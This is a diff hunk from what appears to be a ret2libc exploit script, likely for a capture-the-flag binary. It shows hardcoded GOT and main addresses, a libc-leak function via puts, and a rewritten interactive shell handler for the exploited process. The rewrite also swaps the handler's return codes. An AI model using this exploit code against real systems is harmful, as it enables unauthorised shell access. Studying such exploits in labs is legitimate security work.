@@ -26,29 +26,20 @@ mainAddr = 0x804847b
 gotPuts = 0x80497ac
 gotGets = 0x80497a8
 
-# Check if reverse shell was spawned then handle user input and output for the process
-def handle_reverse_shell(proc, redirect_stderr=True):
-    # Check if shell was sucessfully executed
-    noEOF = True
+def handle_reverse_shell(redirect_stderr=True):
+    """
+    Handles the reverse shell interaction with the process.
+    """
     try:
-        proc.sendline(b"whoami"+b" 2>&1")
-        print(proc.recv(timeout = 0.1).decode('utf-8'))
+        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
+        print(proc.recv(timeout=0.1).decode('utf-8'))
+        while True:
+            command = input("$ ")
+            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
+            print(proc.recv(timeout=0.2).decode('utf-8'))
     except EOFError:
-        noEOF = False
-
-    # Create terminal input with option to automatically redirect stderr to stdout
-    commandModifier = b""
-    if redirect_stderr:
-        commandModifier = b" 2>&1"
-    while noEOF:
-        command = input("$ ")
-        try:
-            proc.sendline((command).encode('utf-8')+commandModifier)
-            print(proc.recv(timeout = 0.2).decode('utf-8'))
-        except EOFError:
-            return 200
-    # If EOF found return 300
-    return 300
+        return 300
+    return 200
 
 # Leak randomised libc address via puts' PLT and function's GOT
 def leakViaPuts(conn, port,putOutAddr, msg="puts"):
